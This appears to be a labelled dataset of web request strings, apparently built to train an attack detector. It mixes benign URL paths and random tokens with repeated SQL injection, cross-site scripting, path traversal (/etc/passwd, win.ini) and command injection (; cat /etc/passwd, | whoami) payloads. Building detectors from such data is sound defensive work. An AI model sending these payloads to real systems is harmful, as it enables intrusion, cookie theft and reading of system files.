%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/register?id=9853,0
cart,0
/dashboard?id=3520,0
s E l E c T * f R o M a d m i n,1
admin' --,1
/home?session=78090,0
/index?id=2484,0
<script>var a=739;alert(a)</script>,1
/user?id=9062,0
<script>var a=649;alert(a)</script>,1
| whoami,1
' OR 8=7 --,1
' OR 6=7 --,1
/search?id=5495,0
ufEebOniGcvREi,0
/user?session=19936,0
' OR 1=1 --,1
/blog?session=64779,0
' OR 4=1 --,1
ff4Jsh2XWz6V,0
onerror=alert(1),1
qXxYILcYRmcj,0
/home?id=9398,0
cart,0
/login?session=29840,0
/profile?id=6262,0
/cart?session=37724,0
' OR 1=8 --,1
dashboard,0
/dashboard?id=681,0
javascript:alert(1),1
s E l E c T * f R o M a d m i n,1
En4BSY0CbZvYbj,0
' OR 3=8 --,1
<script>var a=646;alert(a)</script>,1
<script>var a=12;alert(a)</script>,1
blog,0
PusNxvML,0
../../../windows/win.ini,1
/about?id=4410,0
/login?session=19453,0
s E l E c T * f R o M a d m i n,1
admin' --,1
/contact?session=60421,0
contact,0
; cat /etc/passwd,1
home,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/search?id=2261,0
NEGp825WeUi,0
/about?id=5391,0
Y4OmCBHQmMkJU,0
' OR 2=4 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/profile?id=5532,0
<script>var a=684;alert(a)</script>,1
| whoami,1
admin'/* bypass */OR 1=1,1
user,0
/dashboard?id=8457,0
javascript:alert(1),1
; cat /etc/passwd,1
/register?session=37081,0
/contact?id=1892,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 4=5 --,1
<script>var a=784;alert(a)</script>,1
' OR 5=9 --,1
<script>var a=822;alert(a)</script>,1
checkout,0
/dashboard?session=59693,0
; cat /etc/passwd,1
/login?session=71726,0
<script>alert(document.cookie)</script>,1
<script>var a=986;alert(a)</script>,1
1' o r '1'='1,1
javascript:alert(1),1
admin' --,1
uFMBR4yxCv,0
profile,0
1' o r '1'='1,1
' OR 8=2 --,1
' OR '1'='1,1
/checkout?session=78344,0
uIX2prlNFiEN07r,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
profile,0
admin'/* bypass */OR 1=1,1
/user?id=3196,0
; cat /etc/passwd,1
<script>var a=374;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
javascript:alert(1),1
/about?session=84141,0
cart,0
xb7G5Dhguuq,0
gUe4dQOyd7C0QHz,0
../../../../etc/passwd,1
' OR 7=3 --,1
' OR '1'='1,1
<script>var a=742;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 3=7 --,1
/register?id=5940,0
<script>var a=829;alert(a)</script>,1
' OR 3=7 --,1
qw0UFsxNY3D02Nj,0
home,0
cart,0
1' o r '1'='1,1
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin%00' OR 1=1,1
/about?id=6044,0
/search?session=84861,0
dashboard,0
/login?id=5181,0
admin' --,1
index,0
<script>var a=230;alert(a)</script>,1
1' o r '1'='1,1
' OR 2=2 --,1
1WMfvsdzUv,0
/register?id=5539,0
q4mbNtNEy,0
<script>var a=888;alert(a)</script>,1
cart,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
cart,0
<script>var a=109;alert(a)</script>,1
5ILy9DXs89hs,0
onerror=alert(1),1
/user?id=3910,0
admin'/* bypass */OR 1=1,1
IA6gQ93r,0
checkout,0
| whoami,1
/dashboard?session=80515,0
; cat /etc/passwd,1
/contact?id=5149,0
javascript:alert(1),1
wuWTg0wplbRfFfR,0
../../../../etc/passwd,1
1' o r '1'='1,1
; cat /etc/passwd,1
/profile?session=14475,0
/dashboard?session=10813,0
/contact?session=28289,0
/checkout?id=4458,0
<script>alert(document.cookie)</script>,1
yY92z4ouO,0
/dashboard?id=2308,0
/index?id=964,0
/login?id=6210,0
/index?session=25094,0
../../../windows/win.ini,1
' OR 9=2 --,1
<script>var a=862;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin' --,1
/blog?id=9041,0
/settings?id=6014,0
/contact?id=9145,0
/settings?session=40275,0
/register?session=38722,0
; cat /etc/passwd,1
<script>var a=146;alert(a)</script>,1
/settings?id=8790,0
register,0
s E l E c T * f R o M a d m i n,1
qbJlIrrIKXromi3,0
<script>alert(document.cookie)</script>,1
settings,0
profile,0
' OR 8=5 --,1
1' o r '1'='1,1
settings,0
admin' --,1
home,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>alert(document.cookie)</script>,1
javascript:alert(1),1
home,0
dashboard,0
search,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/register?id=1733,0
p1AX9eiiFU6H,0
<script>var a=357;alert(a)</script>,1
xNlEJDIFCqdc12,0
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
| whoami,1
/blog?id=8968,0
/profile?session=75969,0
a9805fDbvIq4,0
/register?session=50849,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/contact?session=94867,0
l5iWuDaU3ygYRba,0
onerror=alert(1),1
' OR 1=1 --,1
index,0
/blog?id=7292,0
javascript:alert(1),1
<script>alert(document.cookie)</script>,1
' OR 1=7 --,1
' OR 1=1 --,1
<script>var a=247;alert(a)</script>,1
javascript:alert(1),1
/blog?session=46125,0
WKqBWC0Zgph,0
' OR '1'='1,1
admin' --,1
' OR 7=4 --,1
' OR 1=1 --,1
/profile?session=50865,0
admin%00' OR 1=1,1
/user?session=98443,0
login,0
| whoami,1
; cat /etc/passwd,1
/dashboard?session=57698,0
1' o r '1'='1,1
user,0
<script>alert(document.cookie)</script>,1
qehl8ws6rC,0
/login?session=66793,0
<script>var a=547;alert(a)</script>,1
' OR '1'='1,1
' OR 9=7 --,1
dashboard,0
admin' --,1
/dashboard?session=59560,0
/login?session=53557,0
<script>var a=568;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
search,0
checkout,0
; cat /etc/passwd,1
/search?id=392,0
rdJolszG,0
4GboHier,0
<script>var a=25;alert(a)</script>,1
' OR '1'='1,1
se4CTPJhJ0QMW,0
fDgXSK65K,0
register,0
/index?session=72038,0
' OR 6=9 --,1
/cart?id=533,0
../../../windows/win.ini,1
<script>var a=837;alert(a)</script>,1
' OR 5=4 --,1
xXCe2iw0jp0B,0
' OR 7=8 --,1
' OR 4=1 --,1
/login?id=3125,0
' OR 1=4 --,1
' OR 7=5 --,1
login,0
/user?id=6246,0
/checkout?session=39749,0
; cat /etc/passwd,1
profile,0
2VHxMN4rA,0
/user?id=7732,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin' --,1
' OR 2=6 --,1
3Z6nQRZ7wW7,0
; cat /etc/passwd,1
' OR 4=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/profile?id=1732,0
s E l E c T * f R o M a d m i n,1
/index?session=19722,0
/user?session=59425,0
<script>var a=264;alert(a)</script>,1
/settings?id=7977,0
' OR '1'='1,1
/contact?session=57334,0
/index?id=477,0
<script>var a=435;alert(a)</script>,1
/login?id=412,0
s E l E c T * f R o M a d m i n,1
1' o r '1'='1,1
register,0
/dashboard?session=56651,0
' OR 5=3 --,1
cart,0
user,0
/checkout?session=55077,0
/user?session=20606,0
/user?id=2357,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
rST0te9epT0Pz8,0
<script>var a=686;alert(a)</script>,1
EPOJ4XreJI9,0
' OR 1=1 --,1
yUbn6aLn,0
/dashboard?id=6546,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/blog?id=5174,0
/home?id=4226,0
<script>var a=84;alert(a)</script>,1
<script>var a=789;alert(a)</script>,1
1' o r '1'='1,1
settings,0
/cart?session=50448,0
/checkout?session=94993,0
; cat /etc/passwd,1
ZHE5Hm8E,0
admin' --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
profile,0
/about?session=69776,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
ExtcUaHbStPiMo0,0
/user?id=6585,0
' OR 1=5 --,1
/profile?id=8581,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=56;alert(a)</script>,1
<script>var a=597;alert(a)</script>,1
' OR 3=4 --,1
' OR 1=6 --,1
s E l E c T * f R o M a d m i n,1
<script>alert(document.cookie)</script>,1
' OR 4=9 --,1
u8WojTGwlb6ne,0
4Pid7TXSoBa,0
/search?id=5509,0
1' o r '1'='1,1
user,0
/settings?id=3485,0
/cart?id=335,0
/contact?id=2769,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
search,0
index,0
E1UFwCKU,0
../../../../etc/passwd,1
' OR '1'='1,1
ZtFyY5wXzSoN,0
3u2t9kNdd,0
pBVc48yZ1o,0
1' o r '1'='1,1
/user?id=7151,0
10C2b2iIsmVcB,0
../../../../etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=583;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
login,0
onerror=alert(1),1
' OR 2=4 --,1
/cart?session=67439,0
<script>var a=119;alert(a)</script>,1
' OR 1=9 --,1
../../../windows/win.ini,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 7=2 --,1
5XSv58MgblH,0
/dashboard?session=46954,0
v25QPBC3D,0
/search?session=44562,0
9ImeaqVRON,0
| whoami,1
settings,0
4neKDeVYy4sGwE,0
<script>alert(document.cookie)</script>,1
wrRg9GQdXY,0
/register?id=9671,0
<script>var a=375;alert(a)</script>,1
/checkout?id=8655,0
index,0
register,0
S6hKu2enO6H,0
4jJNoRt2UJ,0
<script>var a=816;alert(a)</script>,1
<script>var a=618;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
IM0vifaUXTLcj98,0
about,0
../../../windows/win.ini,1
; cat /etc/passwd,1
| whoami,1
search,0
1' o r '1'='1,1
/blog?id=854,0
checkout,0
' OR 1=1 --,1
1zBCWnncV,0
<script>alert(document.cookie)</script>,1
contact,0
RnFrEjqxTTjD6,0
1' o r '1'='1,1
onerror=alert(1),1
Q2nmKFJ08BXb,0
blog,0
/contact?session=97451,0
<script>var a=843;alert(a)</script>,1
OzY7KxQh1,0
' OR '1'='1,1
/contact?id=303,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=439;alert(a)</script>,1
Ycv1tB70hZWBytD,0
../../../../etc/passwd,1
admin' --,1
26gyBcMkbE5T0wl,0
contact,0
/contact?session=10346,0
onerror=alert(1),1
admin%00' OR 1=1,1
../../../windows/win.ini,1
' OR 8=1 --,1
login,0
Zlq0P7jooIOSja5,0
/about?session=52464,0
' OR 5=5 --,1
s E l E c T * f R o M a d m i n,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 5=1 --,1
/dashboard?session=15136,0
' OR 6=9 --,1
1' o r '1'='1,1
<script>alert(document.cookie)</script>,1
' OR 4=3 --,1
' OR 1=1 --,1
<script>var a=921;alert(a)</script>,1
onerror=alert(1),1
/blog?session=27484,0
/login?id=7443,0
cart,0
/search?id=3689,0
/checkout?id=7481,0
/index?session=20374,0
XEf52AczsTs8bxC,0
<script>alert(document.cookie)</script>,1
<script>alert(document.cookie)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/blog?session=81748,0
/cart?session=21182,0
s E l E c T * f R o M a d m i n,1
' OR 2=6 --,1
../../../../etc/passwd,1
' OR 3=4 --,1
/settings?id=4405,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/contact?id=7376,0
/about?id=6532,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
index,0
t9PyKFoVLMHq4r,0
/dashboard?session=42938,0
/contact?session=39200,0
javascript:alert(1),1
<script>var a=960;alert(a)</script>,1
' OR 1=1 --,1
profile,0
<script>alert(document.cookie)</script>,1
' OR 5=5 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/blog?id=2532,0
xD1QOvkB,0
checkout,0
register,0
<script>alert(document.cookie)</script>,1
/index?id=6808,0
<script>var a=859;alert(a)</script>,1
XJNak0hJVRi,0
/profile?session=87112,0
ksN5H7fUmh5K,0
<script>alert(document.cookie)</script>,1
xffoZMwfq,0
<script>var a=323;alert(a)</script>,1
AJlFiwaKnovugvb,0
onerror=alert(1),1
blog,0
admin'/* bypass */OR 1=1,1
/search?id=5280,0
/about?session=19255,0
search,0
/dashboard?session=54609,0
search,0
/home?session=30001,0
admin' --,1
/dashboard?session=70042,0
ODcI4Urp7F,0
' OR 5=8 --,1
' OR 4=5 --,1
/home?id=5798,0
/index?session=91084,0
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
8uBBJ4Opg,0
/settings?session=32149,0
../../../../etc/passwd,1
<script>var a=219;alert(a)</script>,1
javascript:alert(1),1
dashboard,0
/home?id=6407,0
Cv6DCrDHR,0
; cat /etc/passwd,1
' OR 8=3 --,1
/dashboard?session=55194,0
/index?id=4483,0
/settings?id=6410,0
/search?id=1616,0
admin%00' OR 1=1,1
../../../../etc/passwd,1
' OR '1'='1,1
<script>var a=788;alert(a)</script>,1
admin%00' OR 1=1,1
admin' --,1
admin'/* bypass */OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
search,0
' OR 8=4 --,1
about,0
' OR 2=3 --,1
| whoami,1
/about?id=9915,0
javascript:alert(1),1
' OR 7=9 --,1
' OR 5=3 --,1
<script>alert(document.cookie)</script>,1
admin'/* bypass */OR 1=1,1
/register?id=9981,0
; cat /etc/passwd,1
login,0
index,0
' OR 2=8 --,1
/checkout?id=1958,0
contact,0
' OR 1=1 --,1
/search?session=47501,0
1' o r '1'='1,1
/login?id=7661,0
dashboard,0
/checkout?id=8705,0
user,0
<script>var a=509;alert(a)</script>,1
' OR 1=1 --,1
s E l E c T * f R o M a d m i n,1
1' o r '1'='1,1
' OR 2=8 --,1
7XbTLa9TTkL0Kt,0
checkout,0
login,0
/settings?session=86494,0
/profile?session=75781,0
RfBApO8FuXo2,0
<script>var a=459;alert(a)</script>,1
about,0
/blog?session=87072,0
/about?id=9914,0
' OR 3=8 --,1
/home?id=6437,0
' OR 1=1 --,1
/settings?id=6312,0
home,0
/profile?id=5290,0
y4KzbxOtQuY,0
' OR 7=6 --,1
baB4h6MY,0
profile,0
' OR '1'='1,1
/contact?session=64003,0
/settings?session=17755,0
/cart?id=8134,0
../../../../etc/passwd,1
<script>var a=615;alert(a)</script>,1
/profile?id=1798,0
/about?session=67044,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 7=7 --,1
1' o r '1'='1,1
admin' --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 1=5 --,1
/blog?id=652,0
/user?id=7353,0
' OR 7=1 --,1
; cat /etc/passwd,1
<script>var a=742;alert(a)</script>,1
checkout,0
/contact?session=60140,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/register?id=8402,0
admin%00' OR 1=1,1
<script>var a=764;alert(a)</script>,1
/profile?id=252,0
index,0
/blog?session=68725,0
admin'/* bypass */OR 1=1,1
/blog?id=8029,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
onerror=alert(1),1
| whoami,1
<script>var a=801;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
wbTMLTi9E,0
' OR 3=4 --,1
' OR 7=2 --,1
s E l E c T * f R o M a d m i n,1
/settings?id=3995,0
/checkout?session=69616,0
<script>var a=450;alert(a)</script>,1
<script>var a=635;alert(a)</script>,1
<script>var a=248;alert(a)</script>,1
' OR 6=3 --,1
/settings?id=6873,0
register,0
javascript:alert(1),1
/profile?session=61235,0
' OR 4=1 --,1
| whoami,1
blog,0
7OFot3GQBYj,0
/contact?session=68024,0
/blog?id=3107,0
s E l E c T * f R o M a d m i n,1
' OR 6=8 --,1
admin%00' OR 1=1,1
<script>var a=864;alert(a)</script>,1
blog,0
register,0
' OR 1=6 --,1
s E l E c T * f R o M a d m i n,1
n7uMDfHznwu,0
checkout,0
/blog?session=69694,0
<script>alert(document.cookie)</script>,1
<script>var a=694;alert(a)</script>,1
HpW1AJYsF2,0
/user?session=59627,0
home,0
/blog?session=87598,0
/about?session=79407,0
cart,0
cart,0
/contact?id=7782,0
/register?session=19894,0
| whoami,1
checkout,0
/user?session=40216,0
/user?id=5025,0
user,0
e4zFU2lDk,0
javascript:alert(1),1
/about?session=17440,0
1' o r '1'='1,1
/home?session=28580,0
/search?session=32260,0
' OR 1=7 --,1
/blog?session=64352,0
bOKjWahCNFyIy3J,0
<script>var a=21;alert(a)</script>,1
cart,0
2u3AcLdj,0
<script>var a=361;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin%00' OR 1=1,1
home,0
search,0
7KhMEvim3C,0
/user?session=49449,0
dashboard,0
home,0
' OR 2=2 --,1
<script>var a=198;alert(a)</script>,1
/register?id=149,0
/home?id=6171,0
/checkout?session=96878,0
7VRpsk1x7,0
admin'/* bypass */OR 1=1,1
settings,0
1' o r '1'='1,1
' OR '1'='1,1
/dashboard?id=1837,0
Et1RNaCZHG,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 4=5 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
s E l E c T * f R o M a d m i n,1
/blog?session=99380,0
jSiNc1SE6Nvdq,0
/contact?session=38154,0
rK9DBBUH,0
<script>alert(document.cookie)</script>,1
hCYExDsoaLO,0
1' o r '1'='1,1
<script>var a=914;alert(a)</script>,1
javascript:alert(1),1
register,0
' OR '1'='1,1
YOwqs7yhfLh1U8,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=772;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
' OR 7=8 --,1
/checkout?id=2091,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
onerror=alert(1),1
J28mqyFUjz6Xs7,0
<script>alert(document.cookie)</script>,1
admin' --,1
1' o r '1'='1,1
' OR 1=8 --,1
' OR 3=3 --,1
profile,0
<script>var a=990;alert(a)</script>,1
/about?id=4332,0
' OR 2=9 --,1
<script>var a=48;alert(a)</script>,1
<script>var a=378;alert(a)</script>,1
../../../windows/win.ini,1
/dashboard?session=22834,0
Uqo9rhKbWqeI93,0
settings,0
<script>alert(document.cookie)</script>,1
/blog?session=39308,0
cart,0
<script>var a=14;alert(a)</script>,1
' OR 9=7 --,1
/contact?id=5035,0
index,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR '1'='1,1
<script>var a=981;alert(a)</script>,1
/home?id=2182,0
admin' --,1
/user?id=2942,0
<script>var a=220;alert(a)</script>,1
/user?session=75419,0
blog,0
uM7eI8EF3,0
/search?session=36751,0
s7dfGS3MkDSkv,0
blog,0
CYGwM3dsXS,0
OjJiRwhmR,0
' OR 3=4 --,1
<script>var a=122;alert(a)</script>,1
' OR 1=1 --,1
/about?session=79822,0
' OR 9=7 --,1
/blog?id=3258,0
<script>var a=471;alert(a)</script>,1
' OR 5=8 --,1
<script>var a=219;alert(a)</script>,1
kfYGG29v3m,0
mYsVsBkGbawgOUD,0
../../../../etc/passwd,1
../../../windows/win.ini,1
' OR 9=5 --,1
onerror=alert(1),1
/register?session=62986,0
/user?id=888,0
W52U16qS7oh,0
home,0
admin' --,1
/settings?session=86441,0
muispDxnfzxbTrO,0
W36kewVwKim,0
s E l E c T * f R o M a d m i n,1
1' o r '1'='1,1
j2hz0sopJ0fMS,0
' OR 7=7 --,1
<script>var a=390;alert(a)</script>,1
settings,0
' OR 8=2 --,1
' OR 1=1 --,1
/cart?id=3475,0
' OR 4=9 --,1
home,0
/contact?session=94470,0
contact,0
9ZXOCh5p,0
' OR 8=4 --,1
javascript:alert(1),1
admin'/* bypass */OR 1=1,1
' OR 2=5 --,1
e35v4OBm,0
' OR 4=3 --,1
' OR 9=2 --,1
<script>var a=714;alert(a)</script>,1
register,0
<script>var a=81;alert(a)</script>,1
| whoami,1
/cart?id=401,0
<script>var a=673;alert(a)</script>,1
/index?id=5883,0
' OR 2=8 --,1
3IpbO4Cc,0
<script>var a=299;alert(a)</script>,1
' OR 1=1 --,1
/blog?session=69830,0
s E l E c T * f R o M a d m i n,1
/search?session=70251,0
/contact?session=57621,0
' OR 3=3 --,1
' OR 5=5 --,1
' OR 1=9 --,1
ZKtXOVJJOG,0
cart,0
' OR 1=6 --,1
checkout,0
' OR 9=8 --,1
dPKRTUcFATqTbb3,0
onerror=alert(1),1
' OR 8=3 --,1
../../../windows/win.ini,1
/about?id=1812,0
../../../../etc/passwd,1
/index?session=72180,0
YPBczuMEnpY,0
admin%00' OR 1=1,1
../../../../etc/passwd,1
' OR 6=3 --,1
/user?id=2890,0
' OR 3=2 --,1
' OR 4=7 --,1
/dashboard?session=81559,0
blog,0
register,0
admin' --,1
../../../windows/win.ini,1
; cat /etc/passwd,1
about,0
<script>var a=630;alert(a)</script>,1
Fuo72VFPpKu,0
C2o7X0NsJj,0
javascript:alert(1),1
1' o r '1'='1,1
/login?session=12412,0
; cat /etc/passwd,1
/contact?id=7397,0
/login?id=1518,0
5lseLMV1jlvc,0
' OR 9=7 --,1
' OR 6=2 --,1
/search?id=4321,0
<script>var a=204;alert(a)</script>,1
' OR 1=1 --,1
' OR 5=3 --,1
' OR 9=2 --,1
/user?id=621,0
/blog?id=1218,0
cart,0
' OR 9=1 --,1
EmQgBsCVc,0
<script>var a=495;alert(a)</script>,1
/cart?session=62972,0
; cat /etc/passwd,1
/contact?id=7448,0
/dashboard?session=93612,0
; cat /etc/passwd,1
/login?session=23298,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
siqscni1e1,0
| whoami,1
checkout,0
blog,0
/contact?id=591,0
register,0
/dashboard?id=4723,0
blog,0
onerror=alert(1),1
s E l E c T * f R o M a d m i n,1
kCg7pW4J,0
/contact?id=7004,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR '1'='1,1
s E l E c T * f R o M a d m i n,1
dKPBKT70WeUOI,0
| whoami,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 8=7 --,1
' OR '1'='1,1
| whoami,1
<script>var a=300;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
<script>var a=621;alert(a)</script>,1
cart,0
' OR 1=1 --,1
CnukMMI3r,0
checkout,0
' OR '1'='1,1
H855Hzoj6,0
/profile?id=9137,0
/contact?session=61220,0
/about?id=6933,0
/settings?session=87955,0
../../../../etc/passwd,1
/checkout?session=48927,0
<script>var a=543;alert(a)</script>,1
MrDEfr0I4W,0
/cart?id=1383,0
login,0
<script>var a=870;alert(a)</script>,1
; cat /etc/passwd,1
admin'/* bypass */OR 1=1,1
/settings?session=14380,0
/about?session=24413,0
dashboard,0
dashboard,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
javascript:alert(1),1
/contact?id=9536,0
<script>var a=942;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/index?id=1703,0
' OR 9=2 --,1
onerror=alert(1),1
/blog?id=7811,0
/search?id=3747,0
/about?session=84438,0
1' o r '1'='1,1
/profile?id=132,0
' OR 6=1 --,1
UIBV4Neeq0,0
hP5Wxr8kb,0
contact,0
/search?id=3179,0
admin' --,1
' OR 7=7 --,1
Jd96H1Ls,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/index?id=2961,0
/checkout?id=5562,0
<script>var a=679;alert(a)</script>,1
/settings?session=89102,0
/dashboard?session=48253,0
about,0
index,0
../../../../etc/passwd,1
onerror=alert(1),1
/dashboard?session=51795,0
/search?session=93065,0
/home?session=16424,0
/home?id=2777,0
<script>var a=599;alert(a)</script>,1
| whoami,1
/blog?session=43448,0
; cat /etc/passwd,1
user,0
tSpDHIEjl,0
/register?id=4940,0
' OR '1'='1,1
/settings?id=3312,0
' OR 1=1 --,1
s E l E c T * f R o M a d m i n,1
blog,0
' OR 1=1 --,1
/home?session=27372,0
cart,0
<script>var a=711;alert(a)</script>,1
/profile?id=5804,0
/search?session=47395,0
about,0
' OR 1=1 --,1
login,0
admin%00' OR 1=1,1
register,0
' OR 6=4 --,1
s E l E c T * f R o M a d m i n,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
L6MrcxyHSdi,0
; cat /etc/passwd,1
admin%00' OR 1=1,1
SsG0bDhRqNMa,0
UuVLvNbe3Z,0
wSeCdWLAY567I5w,0
' OR 1=1 --,1
' OR 8=3 --,1
/settings?id=8368,0
' OR 6=5 --,1
/profile?session=79698,0
/home?session=41334,0
3dr1nL2StTX9,0
ZNDSshv2Bk5dGm,0
admin'/* bypass */OR 1=1,1
/blog?session=76826,0
/dashboard?session=50897,0
/profile?session=68005,0
/settings?session=76054,0
<script>var a=286;alert(a)</script>,1
onerror=alert(1),1
1' o r '1'='1,1
<script>var a=687;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
/cart?session=89746,0
user,0
/login?session=41598,0
<script>alert(document.cookie)</script>,1
pQ0D5BNpujHN,0
dashboard,0
<script>var a=215;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/login?session=53816,0
xnbcXgfLF2odBjc,0
/blog?session=89590,0
/cart?id=2913,0
jpnHPOOGZ9,0
/about?session=53647,0
/index?session=36243,0
' OR 3=5 --,1
/user?id=9657,0
javascript:alert(1),1
q3Y54ayt,0
<script>var a=81;alert(a)</script>,1
/register?session=39886,0
index,0
home,0
| whoami,1
/about?id=7002,0
/settings?session=55745,0
/blog?id=9194,0
dPFsAi5if3F,0
/about?id=3014,0
<script>var a=531;alert(a)</script>,1
<script>var a=224;alert(a)</script>,1
javascript:alert(1),1
/blog?id=6128,0
KweHz5XK,0
' OR 3=7 --,1
<script>var a=328;alert(a)</script>,1
' OR 2=1 --,1
profile,0
/dashboard?session=32757,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=853;alert(a)</script>,1
about,0
/home?id=4902,0
pYRbgjR4Try1I,0
gk15DqiTQ,0
' OR 4=6 --,1
' OR 7=8 --,1
register,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR '1'='1,1
<script>var a=463;alert(a)</script>,1
/profile?id=2174,0
<script>var a=485;alert(a)</script>,1
' OR 1=1 --,1
dashboard,0
cart,0
/checkout?id=4381,0
Spow68kSJh3xGi2,0
' OR '1'='1,1
/register?id=6683,0
/blog?id=6472,0
/contact?id=8171,0
login,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin'/* bypass */OR 1=1,1
/contact?session=54614,0
IXG8Y6dK,0
/checkout?session=35871,0
<script>var a=868;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/login?id=6574,0
OG90KioGyFh,0
/contact?session=71313,0
; cat /etc/passwd,1
oC8gpbSjtTpU,0
search,0
/profile?id=3462,0
admin%00' OR 1=1,1
<script>var a=447;alert(a)</script>,1
weEKHlKZhzT5C,0
5PVWKdZhnnOdW,0
gWrZMo76Lwx,0
/checkout?session=45265,0
/settings?session=27197,0
user,0
profile,0
/login?session=62150,0
yLcOYaJ9g,0
/settings?session=82600,0
/about?id=2246,0
tv42AtRI,0
/settings?id=5313,0
blog,0
settings,0
/cart?session=72768,0
admin%00' OR 1=1,1
' OR 9=5 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
iSHgGTIT,0
admin' --,1
user,0
../../../windows/win.ini,1
s E l E c T * f R o M a d m i n,1
admin%00' OR 1=1,1
/search?id=69,0
/checkout?id=5269,0
/user?session=26178,0
about,0
/home?id=8308,0
search,0
vqmHTWbnpJyZbXJ,0
dashboard,0
/search?session=12116,0
admin' --,1
/index?id=3414,0
' OR '1'='1,1
contact,0
admin' --,1
/cart?session=78968,0
onerror=alert(1),1
' OR 1=1 --,1
/login?session=62245,0
/blog?id=4315,0
5Ql7hB73h,0
register,0
/index?session=29351,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin' --,1
admin' --,1
/checkout?session=32083,0
admin' --,1
; cat /etc/passwd,1
s E l E c T * f R o M a d m i n,1
<script>alert(document.cookie)</script>,1
home,0
' OR 6=5 --,1
blog,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
aKvrXp6EBh,0
../../../windows/win.ini,1
/login?id=5716,0
bxuqUxRkISwzp5,0
/home?session=65049,0
checkout,0
MayM34pJo,0
admin'/* bypass */OR 1=1,1
bkla8qBL5Sc,0
../../../../etc/passwd,1
/home?id=6179,0
register,0
' OR 2=5 --,1
' OR 4=6 --,1
../../../../etc/passwd,1
AkN4RG8BybRH,0
| whoami,1
/login?session=23605,0
' OR 1=3 --,1
' OR 7=8 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
1' o r '1'='1,1
| whoami,1
javascript:alert(1),1
login,0
/register?session=83324,0
<script>alert(document.cookie)</script>,1
/login?session=21513,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 1=1 --,1
MuaTOWvjqcf,0
' OR 8=4 --,1
LGno7mSsP47H,0
cart,0
/checkout?id=4816,0
admin'/* bypass */OR 1=1,1
| whoami,1
profile,0
home,0
admin' --,1
' OR 3=6 --,1
' OR 4=3 --,1
' OR 1=1 --,1
../../../windows/win.ini,1
/search?id=8731,0
cart,0
admin' --,1
admin%00' OR 1=1,1
' OR 3=6 --,1
Zsfg5LvX,0
/home?session=55396,0
' OR 1=1 --,1
